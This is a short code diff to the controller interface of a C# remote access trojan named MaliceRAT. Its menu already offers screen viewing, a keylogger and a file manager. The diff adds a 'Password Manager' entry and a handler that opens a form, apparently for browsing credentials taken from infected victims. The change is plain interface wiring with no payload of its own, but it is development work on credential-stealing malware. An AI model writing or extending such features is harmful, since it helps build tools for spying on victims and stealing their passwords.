@@ -325,6 +325,7 @@ namespace MaliceRAT
                 ContextMenuUtilities.CreateContextMenuItem("View Screen", ViewScreen_Click),
                 ContextMenuUtilities.CreateContextMenuItem("Key Logger", KeyLogger_Click),
                 ContextMenuUtilities.CreateContextMenuItem("File Manager", FileManager_Click),
+                ContextMenuUtilities.CreateContextMenuItem("Password Manager", PasswordManager_Click),
                 ContextMenuUtilities.CreateContextMenuItem("Disconnect", Disconnect_Click)
             };
 
@@ -346,6 +347,11 @@ namespace MaliceRAT
         private void FileManager_Click(object sender, EventArgs e)
         {
             OpenFormIfIdExists<FileManagerForm>(id => new FileManagerForm(id, server));
+        }
+
+        private void PasswordManager_Click(object sender, EventArgs e)
+        {
+            OpenFormIfIdExists<PasswordManagerForm>(id => new PasswordManagerForm(id, server));
         }
 
         private void Disconnect_Click(object sender, EventArgs e)
